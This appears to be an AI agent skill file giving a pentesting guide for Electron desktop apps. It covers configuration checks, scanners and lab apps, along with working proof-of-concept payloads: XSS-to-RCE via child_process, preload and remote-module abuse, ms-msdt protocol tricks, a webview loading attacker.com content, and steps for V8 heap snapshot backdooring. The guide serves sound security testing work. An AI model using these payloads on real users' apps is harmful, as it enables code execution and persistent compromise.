---
name: electron-app-pentest
description: Security testing for Electron desktop applications. Use this skill whenever the user needs to audit, test, or analyze Electron apps for vulnerabilities like nodeIntegration misconfigurations, contextIsolation bypasses, XSS-to-RCE chains, preload script issues, shell.openExternal exploits, or V8 heap snapshot tampering. Trigger for any Electron security assessment, vulnerability research, or penetration testing of desktop apps built with Electron.
---

# Electron Desktop App Pentesting

A comprehensive guide for security testing Electron-based desktop applications.

## Quick Start

```bash
# Extract Electron app code
npx asar extract app.asar ./extracted

# Run security scanner
npm install -g @doyensec/electronegativity
electronegativity -i ./extracted

# Check for vulnerable dependencies
npm audit
```

## Understanding Electron Architecture

Electron combines:
- **Main Process**: Full Node.js access, creates windows
- **Renderer Process**: Chromium-based, should have restricted Node.js access

### Critical Security Settings

In `main.js` or `package.json`, check `webPreferences`:

| Setting | Default | Risk if Misconfigured |
|---------|---------|----------------------|
| `nodeIntegration` | `false` | Allows renderer to use `require()` → RCE |
| `contextIsolation` | `true` | If false, allows prototype pollution attacks |
| `sandbox` | `false` | If false, renderer has more Node.js access |
| `webviewTag` | `false` | If true, allows nested webviews with Node.js |
| `enableRemoteModule` | `false` | If true, renderer can access main process APIs |

## Vulnerability Testing Checklist

### 1. Extract and Analyze App Code

```bash
# Find the ASAR file
find . -name "*.asar" -type f

# Extract all files
npx asar extract app.asar ./extracted

# Extract specific file
npx asar extract-file app.asar main.js
```

### 2. Check Main Process Configuration

Look for `BrowserWindow` creation in `main.js`:

```javascript
// VULNERABLE - nodeIntegration enabled
const win = new BrowserWindow({
  webPreferences: {
    nodeIntegration: true,  // ❌ DANGEROUS
    contextIsolation: false // ❌ DANGEROUS
  }
})

// SECURE
const win = new BrowserWindow({
  webPreferences: {
    nodeIntegration: false,
    contextIsolation: true,
    sandbox: true,
    webviewTag: false,
    enableRemoteModule: false
  }
})
```

### 3. Test for XSS-to-RCE (nodeIntegration)

If `nodeIntegration: true`, test with these payloads:

**Windows:**
```html
<img src="x" onerror="require('child_process').execSync('calc.exe')" />
```

**Linux:**
```html
<img src="x" onerror="require('child_process').execSync('gnome-calculator')" />
```

**macOS:**
```html
<img src="x" onerror="require('child_process').execSync('open /System/Applications/Calculator.app')" />
```

### 4. Test Preload Script Vulnerabilities

If `contextIsolation: false`, preload scripts can be abused:

```javascript
// In preload.js - check if it exposes Node.js to renderer
window.runCalc = function() {
  require('child_process').exec('calc')
}

// In renderer - if contextIsolation is false, this works
runCalc() // RCE!
```

### 5. Test shell.openExternal Exploits

Check for `shell.openExternal` usage with untrusted URLs:

```javascript
// VULNERABLE - opens external URL without validation
shell.openExternal(userInputUrl)

// Windows protocol exploits
window.open("ms-msdt:...")
window.open("search-ms:...")
window.open("ms-officecmd:...")
```

### 6. Test webviewTag + IPC

If `webviewTag: true`, test for:

```html
<webview src="https://attacker.com/" preload="file:///malicious.js"></webview>
```

### 7. Test Remote Module

If `enableRemoteModule: true`:

```javascript
// In renderer
const { app } = require('@electron/remote')

// Dangerous API calls
app.relaunch({execPath: "/System/Applications/Calculator.app"})
app.exit()
```

### 8. Test V8 Heap Snapshot Tampering (CVE-2025-55305)

Check if app loads from user-writable location:

```bash
# Windows
ls %AppData%\Local\<app-name>\v8_context_snapshot.bin

# macOS
ls /Applications/<app-name>.app/Contents/Resources/v8_context_snapshot.bin
```

If writable, you can inject malicious snapshots:

```bash
# Create payload.js with gadget code
# Build snapshot
npx -y electron-mksnapshot@37.2.6 "/path/to/payload.js"

# Overwrite the snapshot file
# App will execute your code on next launch
```

## Automated Testing Tools

### Electronegativity

```bash
npm install -g @doyensec/electronegativity
electronegativity -i ./extracted
```

### nodejsscan

```bash
pip install nodejsscan
nodejsscan -i ./extracted
```

### Custom Configuration Checker

Use the `check_electron_config.sh` script to scan for common misconfigurations.

## Lab Practice

Download vulnerable Electron apps for practice:

```bash
# nodeIntegration vulnerability
wget https://training.7asecurity.com/ma/webinar/desktop-xss-rce/apps/vulnerable1.zip

# contextIsolation via preload
wget https://training.7asecurity.com/ma/webinar/desktop-xss-rce/apps/vulnerable2.zip

# IPC RCE
wget https://training.7asecurity.com/ma/webinar/desktop-xss-rce/apps/vulnerable3.zip

# Run the app
cd vulnerable1
npm install
npm start
```

## Reporting Findings

When documenting vulnerabilities:

1. **Vulnerability Type**: nodeIntegration, contextIsolation, preload, etc.
2. **Location**: File path and line number
3. **Impact**: RCE, file read, credential theft, etc.
4. **Proof of Concept**: Working exploit code
5. **Remediation**: Specific configuration changes

## References

- [Electronegativity](https://github.com/doyensec/electronegativity)
- [Electron Security Best Practices](https://www.electronjs.org/docs/latest/tutorial/security)
- [Doyensec Electron APIs Misuse](https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html)
- [Awesome ElectronJS Hacking](https://github.com/doyensec/awesome-electronjs-hacking)
- [CVE-2025-55305 - V8 Heap Snapshot Tampering](https://blog.trailofbits.com/2025/09/03/subverting-code-integrity-checks-to-locally-backdoor-signal-1password-slack-and-more/)
